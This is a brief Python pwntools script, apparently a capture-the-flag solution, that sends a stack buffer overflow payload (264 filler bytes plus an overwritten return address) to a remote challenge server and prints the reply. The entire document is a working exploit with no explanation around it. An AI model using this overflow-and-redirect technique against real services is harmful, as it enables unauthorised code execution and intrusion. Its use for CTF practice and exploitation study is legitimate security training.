from pwn import *

payload = 'A'*264+p64(0x4006e7)
p = remote('chals20.cybercastors.com',14425)
print p.recvuntil(': ')
p.sendline(payload)
print p.recvall()
